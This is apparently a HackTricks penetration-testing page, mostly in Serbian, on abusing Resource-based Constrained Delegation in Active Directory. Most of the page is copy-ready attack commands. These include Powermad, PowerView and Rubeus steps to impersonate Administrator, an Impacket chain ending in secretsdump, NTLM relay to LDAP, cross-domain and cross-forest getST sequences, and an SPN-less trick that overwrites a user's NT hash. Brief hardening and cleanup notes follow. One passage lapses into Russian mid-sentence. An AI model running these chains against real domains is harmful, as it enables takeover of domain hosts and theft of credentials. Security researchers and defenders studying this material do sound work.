# Resource-based Constrained Delegation

{{#include ../../banners/hacktricks-training.md}}


## Osnove Resource-based Constrained Delegation

Resource-based constrained delegation (RBCD) sličan je [constrained delegation](constrained-delegation.md), ali je smer poverenja obrnut. Kod tradicionalnog constrained delegation-a beleži se kojim servisima principal može da delegira; RBCD beleži na **ciljnom resursu** koji principal-i mogu da se predstavljaju kao korisnici tog resursa.<sup>[[12]](#references)</sup>

Atribut _**msDS-AllowedToActOnBehalfOfOtherIdentity**_ objekta cilja sadrži bezbednosni deskriptor koji identifikuje principal-e kojima je dozvoljeno da deluju u ime drugih identiteta na tom resursu.

Još jedna važna razlika je u tome što principal sa dovoljnim **write dozvolama nad mašinskim nalogom** (`GenericAll`, `GenericWrite`, `WriteDacl`, `WriteProperty` i sličnim pravima) može da postavi atribut _**msDS-AllowedToActOnBehalfOfOtherIdentity**_. Konfigurisanje tradicionalnog constrained delegation-a obično zahteva privilegovaniji administrativni pristup.<sup>[[1]](#references)</sup>

Preciznije, izmene podešavanja klasičnog constrained delegation-a obično su ograničene pravom `SeEnableDelegationPrivilege` na kontroleru domena, koje najčešće imaju visoko privilegovani administratori. RBCD prebacuje odluku na bezbednosni deskriptor ciljnog objekta, pa write pristup relevantnom svojstvu objekta računara može biti dovoljan i bez tog korisničkog prava.<sup>[[1]](#references)[[2]](#references)</sup>

### Novi koncepti

Zastavica **`TrustedToAuthForDelegation`** u `userAccountControl` često se opisuje kao preduslov za **S4U2Self**, ali to nije sasvim tačno.\
Service principal sa SPN-om može da zatraži S4U2Self i bez te zastavice. Kada je postavljena zastavica `TrustedToAuthForDelegation`, vraćena service ticket karta je **forwardable**; bez nje, karta je obično **non-forwardable**.<sup>[[5]](#references)</sup>

Tradicionalni constrained delegation odbija **non-forwardable TGS** u koraku S4U2Proxy. RBCD može da prihvati tu S4U2Self kartu ako bezbednosni deskriptor cilja ovlašćuje servis koji podnosi zahtev.<sup>[[1]](#references)[[2]](#references)[[16]](#references)</sup>

### Struktura napada

> Ako imate **privilegije ekvivalentne write dozvolama** nad **nalogom računara**, možda ćete moći da steknete privilegovani pristup toj mašini.

Pretpostavimo da napadač već ima **privilegije ekvivalentne write dozvolama nad objektom računara žrtve**.

1. Napadač **kompromituje** nalog sa **SPN-om** ili ga **kreira** („Service A“). Podrazumevano, autentifikovani korisnik domena može da kreira najviše 10 objekata računara, u skladu sa podešavanjem **_MachineAccountQuota_**; objekat računara automatski obezbeđuje upotrebljive SPN-ove.
2. Napadač **zloupotrebljava svoju WRITE privilegiju** nad računarom žrtve (ServiceB) da konfiguriše **resource-based constrained delegation tako da ServiceA može da se predstavlja kao bilo koji korisnik** u odnosu na taj računar žrtve (ServiceB).
3. Napadač koristi Rubeus da izvrši **potpuni S4U napad** (S4U2Self i S4U2Proxy) sa Service A na Service B za korisnika **koji ima privilegovan pristup Service B**.
   1. S4U2Self (sa kompromitovanog ili kreiranog SPN naloga): zatraži **TGS kartu koja predstavlja Administrator-a za Service A** (non-forwardable).
   2. S4U2Proxy: upotrebi tu **non-forwardable TGS kartu** da zatraži service ticket kartu koja predstavlja **Administrator-a** na **računaru žrtve**.
   3. Non-forwardable karta i dalje može da funkcioniše u ovom RBCD toku jer je Service A ovlašćen u bezbednosnom deskriptoru ciljnog resursa.
4. Napadač može da izvrši **pass-the-ticket** i da se **predstavlja kao** korisnik kako bi stekao **pristup ServiceB žrtve**.<sup>[[1]](#references)</sup>

`MachineAccountQuota=0` onemogućava podrazumevani način kreiranja računara, ali ne uklanja write prava nad objektom ciljnog računara niti kontrolu nad postojećim nalogom. Kontrolisani običan korisnik bez SPN-a ponekad može da se upotrebi kao principal koji delegira, putem metode [SPN-less U2U](#spn-less-cross-domain--cross-forest-rbcd), uključujući i unutar jednog domena. Za taj put su i dalje potrebni efektivno RBCD write pravo, kontrola nad akreditivima korisnika koji delegira, identitet koji se može delegirati, kompatibilno ponašanje Kerberos enkripcije i promena NT hash-a koja onemogućava nalog. Tretirajte ih kao odvojene preduslove; prazan RBCD atribut ili nulta kvota sami po sebi ne dokazuju ni uspeh ni bezbednost.

Postojeći RBCD deskriptor može da navodi i **grupu**, umesto direktno računara koji delegira. Ako kontrolišete nalog računara koji ima SPN i možete da ga dodate u tu grupu, novo članstvo može da obezbedi put za delegaciju bez izmene RBCD atributa ciljnog računara. Pre nego što zaključite da put funkcioniše, proverite efektivnu ACL za upis članstva u grupu (uključujući deny ACE), ugnježdeno članstvo i osvežavanje tokena, SID trustee-ja u deskriptoru, ograničenja delegacije za nalog koji se impersonira i SPN ciljnog servisa.

Da biste proverili _**MachineAccountQuota**_ domena, možete da upotrebite:

```bash
Get-DomainObject -Identity "dc=domain,dc=local" -Domain domain.local | select MachineAccountQuota
```

## Napad

### Kreiranje računarskog objekta

Možete da kreirate računarski objekat u okviru domena pomoću **[powermad](https://github.com/Kevin-Robertson/Powermad):**<sup>[[3]](#references)[[4]](#references)</sup>

```bash
import-module powermad
New-MachineAccount -MachineAccount SERVICEA -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose

# Check if created
Get-DomainComputer SERVICEA
```

### Konfigurisanje delegiranja sa ograničenjem zasnovanog na resursima

**Korišćenjem Active Directory PowerShell modula**<sup>[[4]](#references)</sup>

```bash
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount SERVICEA$ #Assign delegation privileges
Get-ADComputer $targetComputer -Properties PrincipalsAllowedToDelegateToAccount #Check that it worked
```

**Korišćenje powerview**<sup>[[3]](#references)</sup>

```bash
$ComputerSid = Get-DomainComputer FAKECOMPUTER -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer $targetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

#Check that it worked
Get-DomainComputer $targetComputer -Properties 'msds-allowedtoactonbehalfofotheridentity'

msds-allowedtoactonbehalfofotheridentity
----------------------------------------
{1, 0, 4, 128...}
```

### Izvođenje kompletnog S4U napada (Windows/Rubeus)

Najpre smo kreirali novi objekat računara sa lozinkom `123456`, pa nam je potreban hash te lozinke:<sup>[[3]](#references)[[4]](#references)</sup>

```bash
.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local
```

Ovo će ispisati RC4 i AES hash-eve za taj nalog.\
Sada se napad može izvesti:<sup>[[3]](#references)[[4]](#references)</sup>

```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<aes256 hash> /aes128:<aes128 hash> /rc4:<rc4 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /domain:domain.local /ptt
```

Možete generisati više tickets za više servisa jednim zahtevom, koristeći parametar `/altservice` u Rubeus-u:

```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<AES 256 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /altservice:krbtgt,cifs,host,http,winrm,RPCSS,wsman,ldap /domain:domain.local /ptt
```

> [!CAUTION]
> Korisnici mogu biti označeni kao **„Nalog je osetljiv i ne može se delegirati.“** Ako je ova zastavica omogućena, nalog se ne može impersonirati kroz ovaj tok delegacije. BloodHound prikazuje ovo svojstvo tokom analize.

### Linux alati: RBCD od početka do kraja pomoću Impacket-a (2024+)

Ako radite iz Linux-a, možete izvršiti ceo RBCD lanac pomoću zvaničnih Impacket alata:<sup>[[6]](#references)[[7]](#references)</sup>

```bash
# 1) Create attacker-controlled machine account (respects MachineAccountQuota)
impacket-addcomputer -computer-name 'FAKE01$' -computer-pass 'P@ss123' -dc-ip 192.168.56.10 'domain.local/jdoe:Summer2025!'

# 2) Grant RBCD on the target computer to FAKE01$
#    -action write appends/sets the security descriptor for msDS-AllowedToActOnBehalfOfOtherIdentity
impacket-rbcd -delegate-to 'VICTIM$' -delegate-from 'FAKE01$' -dc-ip 192.168.56.10 -action write 'domain.local/jdoe:Summer2025!'

# 3) Request an impersonation ticket (S4U2Self+S4U2Proxy) for a privileged user against the victim service
impacket-getST -spn cifs/victim.domain.local -impersonate Administrator -dc-ip 192.168.56.10 'domain.local/FAKE01$:P@ss123'

# 4) Use the ticket (ccache) against the target service
export KRB5CCNAME=$(pwd)/Administrator.ccache
# Example: dump local secrets via Kerberos (no NTLM)
impacket-secretsdump -k -no-pass Administrator@victim.domain.local
```

Napomene
- Ako je LDAP signing/LDAPS obavezno, koristite `impacket-rbcd -use-ldaps ...`.
- Dajte prednost AES ključevima; mnogi moderni domeni ograničavaju RC4. Impacket i Rubeus podržavaju tokove koji koriste samo AES.
- Impacket može da prepiše `sname` („AnySPN“) za neke alate, ali kad god je moguće, pribavite ispravan SPN (npr. CIFS/LDAP/HTTP/HOST/MSSQLSvc).

## RBCD između domena i šuma

Ako se **principal koji delegira** i koji kontrolišete nalazi u **drugom domenu** (ili čak **drugom šumu**) od računara koji predstavlja resurs, zloupotreba je i dalje **RBCD**, ali tok tiketa više nije uobičajeni `S4U2Self -> S4U2Proxy` unutar jednog domena.

### RBCD između domena: konfigurisanje stranog principala pomoću SID-a

Kada podešavate `msDS-AllowedToActOnBehalfOfOtherIdentity` iz **drugog domena**, stranu mašinu/korisnika možda **neće biti moguće razrešiti po imenu** u LDAP-u ciljnog domena. U tom slučaju, konfigurišite stavku delegiranja pomoću **SID-a** stranog principala, а не его sAMAccountName/UPN.

Это особенно актуально при ретрансляции NTLM в LDAP с помощью `ntlmrelayx.py`:<sup>[[9]](#references)</sup>

```bash
sudo ntlmrelayx.py -smb2support -t ldap://192.168.90.217 \
  --no-dump --no-da --no-validate-privs \
  --delegate-access \
  --escalate-user S-1-5-21-3104832133-133926542-3798009529-1106 \
  --sid
```

Napomene:
- `--sid` govori alatu `ntlmrelayx.py` da tretira `--escalate-user` kao SID, što je neophodno kada je delegirajući nalog iz drugog domena od ciljnog.
- Čak i ako alat ispiše `User not found in LDAP`, upis delegacije i dalje može uspeti jer bezbednosni deskriptor direktno čuva strani SID.

### RBCD između domena: S4U sekvenca između realm-ova

Kada se strani principal nađe u `msDS-AllowedToActOnBehalfOfOtherIdentity`, funkcionalni tok između domena izgleda ovako:<sup>[[9]](#references)[[13]](#references)</sup>

1. Preuzmite **TGT** za delegirajući principal iz njegovog domena.
2. Zatražite **referral TGT** za `krbtgt/<target-domain>`.
3. Zatražite **cross-realm S4U2Self referral** za korisnika čiju личност treba impersonirati na DC-ju ciljnog domena.
4. Zatražite stvarni **S4U2Self** ticket za tog korisnika nazad u delegator domenu.
5. Izvršite **S4U2Proxy** u delegator domenu da biste dobili referral ticket za ciljni domen.
6. Izvršite završni **S4U2Proxy** na DC-ju ciljnog domena da biste dobili service ticket za `cifs/host.target`, `host/host.target` itd.

Zbog toga standardni Linux alati često ne uspevaju sa cross-domain RBCD:<sup>[[9]](#references)</sup>
- **realm** zahteva možda mora da se razlikuje od realm-a TGT-ja korišćenog u `TGS-REQ`
- lanac zahteva **nezavisne S4U2Proxy korake**, a ne samo `S4U2Self` ili `S4U2Self` praćen jednim `S4U2Proxy` korakom

### Cross-domain RBCD iz Linux-a

Synacktiv je objavio Impacket implementaciju `getST.py` koja reprodukuje cross-realm sekvencu iz Linux-a tako što eksplicitno obrađuje dva KDC-ja:<sup>[[9]](#references)[[11]](#references)</sup>

```bash
python3 ./getST.py dev.asgard.local/rbcd_test\$:R[...]5 -k \
  -dc-ip 192.168.90.131 \
  -targetdc 192.168.90.217 \
  -targetdomain asgard.local \
  -impersonate thor_adm \
  -spn cifs/workstation.asgard.local

KRB5CCNAME=thor_adm@cifs_workstation.asgard.local@ASGARD.LOCAL.ccache \
  ./smbclient.py "asgard.local/thor_adm@workstation.asgard.local" \
  -k -no-pass -dc-ip 192.168.90.217
```

Operativno, novi argumenti su:
- `-dc-ip`: DC delegirajućeg domena
- `-targetdomain`: domen računara resursa
- `-targetdc`: DC domena resursa

### Ograničenja RBCD-a između šuma

RBCD između šuma ima važno ograničenje: **impersonirani korisnik mora pripadati istom šumu kao i delegirajući principal**. Drugim rečima, ako je vaš kontrolisani račun računara u `valhalla.local`, a ciljni resurs u `asgard.local`, uglavnom **ne možete impersonirati proizvoljne korisnike iz `asgard.local` na tom resursu putem RBCD-a**.<sup>[[9]](#references)</sup>

I dalje je moguće iskoristiti ovu tehniku kada:
- je korisnik iz **delegirajućeg šuma** **local admin** (ili na drugi način ima povišene privilegije) na hostu resursa u drugom šumu
- trust omogućava neophodan put autentifikacije, a strani SID je prihvaćen u deskriptoru bezbednosti ciljnog računara

### Specifičnosti RBCD protokola između šuma

RBCD između šuma nije samo „između domena uz trust“. Uočeni tok uključuje dve specifičnosti koje uobičajeni alati istorijski nisu uzimali u obzir:<sup>[[9]](#references)</sup>

1. Dodatni zahtev **S4U2Proxy** koji postavlja **`PA-PAC-OPTIONS=branch-aware`**
2. Završna servisna karta može biti vraćena korišćenjem **RC4**, čak i kada su zatraženi drugi tipovi šifrovanja

Praktični tok je sledeći:

1. Preuzmite TGT za delegirajući principal u šumu A.
2. Zatražite **S4U2Self** za impersoniranog korisnika u šumu A.
3. Zatražite **S4U2Proxy** u šumu A da biste dobili referral TGT za šumu B.
4. Pošaljite drugi zahtev **S4U2Proxy** u šumu A **bez S4U2Self karte kao dodatne karte**, ali sa uključenom opcijom `branch-aware`, da biste dobili još jedan referral TGT za šumu B.
5. Opciono, zatražite običnu servisnu kartu u šumu B za delegirajući principal (ova karta nije neophodna za završnu zloupotrebu).
6. Upotrebite referral karte iz koraka 3 i 4 da biste zatražili završnu kartu **S4U2Proxy** u šumu B za korisnika iz šuma A koji se impersonira, prema ciljnom SPN-u.

### RBCD između šuma iz Linuxa

Ista Synacktiv grana Impacket-a dodaje prekidač `-forest` za ovu logiku:<sup>[[9]](#references)[[11]](#references)</sup>

```bash
python3 ./getST.py -spn 'cifs/workstation.asgard.local' \
  -impersonate 'v_thor' \
  -dc-ip VALHALLA.local \
  valhalla.local/'desktop$' \
  -targetdc ASGARD.local \
  -targetdomain asgard.local \
  -aesKey 4[...]f \
  -forest
```

### Rekurzivni RBCD u više domena (3+ domena)

U **šumama sa više domena**, i **S4U2Self** i **S4U2Proxy** mogu biti **rekurzivni**, umesto da se zaustave nakon jednog upućivanja:

- **Rekurzivni S4U2Self**: prvi `S4U2Self` šalje se u **domen korisnika čiji se identitet preuzima**, prolazi se kroz međukorake nadređenih/podređenih domena uz uobičajena `TGS-REQ` upućivanja za `krbtgt/<REALM>`, a **završni `S4U2Self`** šalje se u **domenu delegirajućeg principal-a**.
- To znači da **samo posedovanje TGT-a** za machine account može biti dovoljno da se preuzme identitet **administratora iz drugog domena u istoj šumi** i zatraži `cifs/host`, `host/host`, `wsman/host` itd.
- **Rekurzivni S4U2Proxy** prati isti lanac poverenja: međukoraci ponovo koriste prethodnu kartu kao TGT dok traže upućivanje `krbtgt/<REALM>` ka sledećem domenu, a završnu service ticket vraća tek poslednji korak.<sup>[[10]](#references)</sup>

Praktičan primer u istoj šumi je:

```bash
KRB5CCNAME=MIN-FRPERSO-01\$.ccache getST.py 'minus.sub.frperso.local/MIN-FRPERSO-01$' -k -no-pass \
  -impersonate Administrator@frperso.local -self \
  -altservice cifs/min-frperso-01.minus.sub.frperso.local

KRB5CCNAME=Administrator@frperso.local@cifs_min-frperso-01.minus.sub.frperso.local@MINUS.SUB.FRPERSO.LOCAL.ccache \
  smbclient.py frperso.local/Administrator@min-frperso-01.minus.sub.frperso.local -k -no-pass
```

### RBCD bez SPN-a između domena / šuma

Ako je **delegirajući principal korisnik bez SPN-a**, poslednji rekurzivni `S4U2Self` ne uspeva uz grešku **`KDC_ERR_S_PRINCIPAL_UNKNOWN`**. Rešenje je da se **ponovi samo poslednji korak pomoću `S4U2Self+U2U`**.<sup>[[10]](#references)</sup>

Ukratko, lanac zloupotrebe:

1. Autentifikujte se pomoću **NT hash-a** kako bi KDC koristio **RC4-HMAC (etype 23)**.
2. Prvo zatražite **`-self -u2u`** i sačuvajte taj ticket odvojeno od kasnijeg proxy koraka.
3. Izdvojite **ključ sesije TGT-a** pomoću `describeTicket.py`.
4. Zamenite korisnikov **NT hash** tim **ključem sesije** pomoću `changepasswd.py -newhashes <session_key>`.
5. Ponovo upotrebite ticket `S4U2Self+U2U` kao **`-additional-ticket`** tokom zasebnog zahteva **`-proxy`**.

```bash
getST.py sub.frperso.local/Administrator -hashes ':<nthash>' \
  -impersonate Administrator@frperso.local -self -u2u
describeTicket.py Administrator.ccache
changepasswd.py sub.frperso.local/Administrator@sub-frperso-01.sub.frperso.local \
  -hashes ':<nthash>' -newhashes <tgt_session_key>
KRB5CCNAME=Administrator.ccache getST.py sub.frperso.local/Administrator -k -no-pass \
  -impersonate Administrator@frperso.local -proxy -proxydomain frpublic.local \
  -spn cifs/frpublic-01.frpublic.local -additional-ticket '<u2u_ticket.ccache>'
```

Operativne napomene:

- Kada je **prvi pouzdani hop već druga šuma**, prednost dajte algoritmu koji uzima u obzir grane (`getST.py ... -forest`) kako bi se podudaralo s izvornim ponašanjem Windowsa. Ako se do strane šume stiže tek **kasnije** u lancu, nerekurzivni tok koji ne uzima u obzir grane i dalje može da funkcioniše.<sup>[[9]](#references)</sup>
- Na novijim DC-ovima sa **Windows Server 2022/2025**, forsirani RC4 može da ne uspe uz grešku **`KDC_ERR_ETYPE_NOSUPP`** zbog zastarevanja RC4; zbog toga **RBCD bez SPN-a** može biti nemoguć, iako klasični RBCD zasnovan na SPN-u i dalje radi uz AES.<sup>[[15]](#references)</sup>
- Pokrenite **`S4U2Self+U2U` pre promene heša/lozinke korisnika**: **`SamrChangePasswordUser`** ne izračunava ponovo Kerberos AES ključeve naloga, pa promena lozinke pre toga može da prekine kasnije zahteve za tiketima.<sup>[[14]](#references)</sup>
- Lažni nalog i dalje mora da bude **delegabilan**: **Protected Users** i nalozi sa **`NOT_DELEGATED`** / **"Account is sensitive and cannot be delegated"** blokiraju lanac.

## Napomene o detekciji / ojačavanju

- RBCD putanje kroz domene/šume obično se i dalje uspostavljaju zloupotrebom **ACL-a** ili **relay-to-LDAP**. Nametnite **LDAP signing** i **LDAP channel binding** na DC-ovima da biste prekinuli uobičajene načine uspostavljanja.
- Proverite ko može da upisuje `msDS-AllowedToActOnBehalfOfOtherIdentity` na računarskim objektima i razrešite sačuvane SID-ove, uključujući **strane bezbednosne principal-e**.
- U okruženjima sa mnogo poverenja pregledajte **Selective Authentication**, **SID filtering** i da li korisnici iz strane šume imaju prava **lokalnog administratora** na hostovima sa resursima.

### Pristupanje

Poslednja komandna linija izvršava **kompletan S4U napad i ubacuje TGS** od Administratora ka hostu žrtve u **memoriju**.\
U ovom primeru zatražen je TGS za uslugu **CIFS** od Administratora, pa ćete moći da pristupite **C$**:

```bash
ls \\victim.domain.local\C$
```

### Zloupotreba različitih service tickets

Saznajte više o [**dostupnim service ticket-ovima ovde**](silver-ticket.md#available-services).

## Enumerisanje, revizija i čišćenje

### Enumerisanje računara sa konfigurisanom RBCD

PowerShell (dekodiranje SD-a radi razrešavanja SID-ova):

```powershell
# List all computers with msDS-AllowedToActOnBehalfOfOtherIdentity set and resolve principals
Import-Module ActiveDirectory
Get-ADComputer -Filter * -Properties msDS-AllowedToActOnBehalfOfOtherIdentity |
  Where-Object { $_."msDS-AllowedToActOnBehalfOfOtherIdentity" } |
  ForEach-Object {
    $raw = $_."msDS-AllowedToActOnBehalfOfOtherIdentity"
    $sd  = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $raw, 0
    $sd.DiscretionaryAcl | ForEach-Object {
      $sid  = $_.SecurityIdentifier
      try { $name = $sid.Translate([System.Security.Principal.NTAccount]) } catch { $name = $sid.Value }
      [PSCustomObject]@{ Computer=$_.ObjectDN; Principal=$name; SID=$sid.Value; Rights=$_.AccessMask }
    }
  }
```

Impacket (čitajte ili ispraznite jednom komandom):

```bash
# Read who can delegate to VICTIM
impacket-rbcd -delegate-to 'VICTIM$' -action read 'domain.local/jdoe:Summer2025!'
```

### Čišćenje / resetovanje RBCD

- PowerShell (brisanje atributa):

```powershell
Set-ADComputer $targetComputer -Clear 'msDS-AllowedToActOnBehalfOfOtherIdentity'
# Or using the friendly property
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount $null
```

- Impacket:

```bash
# Remove a specific principal from the SD
impacket-rbcd -delegate-to 'VICTIM$' -delegate-from 'FAKE01$' -action remove 'domain.local/jdoe:Summer2025!'
# Or flush the whole list
impacket-rbcd -delegate-to 'VICTIM$' -action flush 'domain.local/jdoe:Summer2025!'
```

## Kerberos greške

- **`KDC_ERR_ETYPE_NOTSUPP`**: To znači da je Kerberos konfigurisan tako da ne koristi DES ni RC4, a vi navodite samo RC4 hash. Navedite Rubeus-u bar AES256 hash (ili mu navedite RC4, AES128 i AES256 hash). Primer: `[Rubeus.Program]::MainString("s4u /user:FAKECOMPUTER /aes256:CC648CF0F809EE1AA25C52E963AC0487E87AC32B1F71ACC5304C73BF566268DA /aes128:5FC3D06ED6E8EA2C9BB9CC301EA37AD4 /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:Administrator /msdsspn:CIFS/M3DC.M3C.LOCAL /ptt".split())`
- **`KDC_ERR_S_PRINCIPAL_UNKNOWN`** tokom `-self` za običnog korisnika: delegirajući principal verovatno **nema SPN**. Ponovite **poslednji korak** koristeći **`S4U2Self+U2U`** umesto uobičajenog `S4U2Self`.<sup>[[10]](#references)</sup>
- **`KDC_ERR_ETYPE_NOSUPP`** tokom **RBCD bez SPN-a**: noviji DC-ovi mogu da odbiju prinudni **RC4-HMAC** put koji zahteva trik `S4U2Self+U2U` + zamena session key-a. Umesto toga, isprobajte klasičan RBCD put sa **SPN-om** i AES-om.<sup>[[10]](#references)[[15]](#references)</sup>
- **`KRB_AP_ERR_SKEW`**: To znači da je vreme na trenutnom računaru različito od vremena na DC-u i da Kerberos ne radi ispravno.
- **`preauth_failed`**: To znači da navedeno korisničko ime i hash-evi ne omogućavaju prijavu. Možda ste zaboravili da stavite „$“ u korisničko ime prilikom generisanja hash-eva (`.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local`)
- **`KDC_ERR_BADOPTION`**: Ovo može da znači:
  - Korisnik kog pokušavate da lažno predstavite ne može da pristupi željenoj usluzi (jer ne možete da ga lažno predstavljate ili nema dovoljne privilegije).
  - Tražena usluga ne postoji (ako zatražite ticket za WinRM, a WinRM nije pokrenut).
  - Kreirani fakecomputer je izgubio privilegije nad ranjivim serverom i morate ponovo da mu ih dodelite.
  - Zloupotrebljavate klasični KCD; imajte na umu da RBCD radi sa `S4U2Self` ticket-ima koji nisu forwardable, dok KCD zahteva forwardable ticket-e.

## Napomene, relayi i alternative

- RBCD SD možete da upišete i preko AD Web Services (ADWS) ako je LDAP filtriran. Pogledajte:


{{#ref}}
adws-enumeration.md
{{#endref}}

- Kerberos relay lanci se često završavaju sa RBCD-om kako bi se lokalni SYSTEM dobio u jednom koraku. Pogledajte praktične primere od početka do kraja:


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

- Ako su LDAP signing/channel binding **isključeni** i možete da kreirate nalog računara, alati kao što je **KrbRelayUp** mogu da relay-uju iznuđenu Kerberos autentifikaciju ka LDAP-u, podese `msDS-AllowedToActOnBehalfOfOtherIdentity` za vaš nalog računara na objektu ciljnog računara i odmah lažno predstave **Administrator** preko S4U-a sa računara van hosta.<sup>[[8]](#references)</sup>

## References

- [1] [Mašući psom: zloupotreba delegiranja sa ograničenjima zasnovanog na resursima za napad na Active Directory](https://eladshamir.com/2019/01/28/Wagging-the-Dog.html)
- [2] [Još jedna reč o delegiranju – harmj0y](https://blog.harmj0y.net/redteaming/another-word-on-delegation/)
- [3] [Kerberos delegiranje sa ograničenjima zasnovano na resursima: preuzimanje objekta računara](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object)
- [4] [Netwrix – zloupotreba delegiranja sa ograničenjima zasnovanog na resursima](https://netwrix.com/en/resources/blog/resource-based-constrained-delegation-abuse/)
- [5] [Kerberosity je uništio domen: pregled ofanzivnog Kerberos-a](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)
- [6] [Impacket rbcd.py (zvanično)](https://github.com/fortra/impacket/blob/master/examples/rbcd.py)
- [7] [Kratak Linux podsetnik sa novijom sintaksom](https://tldrbins.github.io/rbcd/)
- [8] [0xdf – HTB Bruno (LDAP signing isključen → Kerberos relay ka RBCD-u)](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [9] [Synacktiv - istraživanje RBCD-a između domena i šuma](https://www.synacktiv.com/en/publications/exploring-cross-domain-cross-forest-rbcd.html)
- [10] [Synacktiv - istraživanje RBCD-a između domena i šuma: drugi deo](https://www.synacktiv.com/en/publications/exploring-cross-domain-cross-forest-rbcd-part-2.html)
- [11] [Impacket grana Synacktiv-a - cross_forest_rbcd](https://github.com/synacktiv/impacket/tree/cross_forest_rbcd)
- [12] [Microsoft Learn - pregled Kerberos delegiranja sa ograničenjima](https://learn.microsoft.com/en-us/windows-server/security/kerberos/kerberos-constrained-delegation-overview)
- [13] [Microsoft Open Specifications - S4U2Self između domena](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/f35b6902-6f5e-4cd0-be64-c50bbaaf54a5)
- [14] [Microsoft Open Specifications - SamrChangePasswordUser](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-samr/9699d8ca-e1a4-433c-a8c3-d7bebeb01476)
- [15] [Microsoft Learn - otkrivanje i otklanjanje upotrebe RC4 u Kerberos-u](https://learn.microsoft.com/en-us/windows-server/security/kerberos/detect-remediate-rc4-kerberos)
- [16] [Microsoft Open Specifications – detalji o S4U2Proxy](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/bde93b0e-f3c9-4ddf-9cd5-e9c237331c90)
{{#include ../../banners/hacktricks-training.md}}
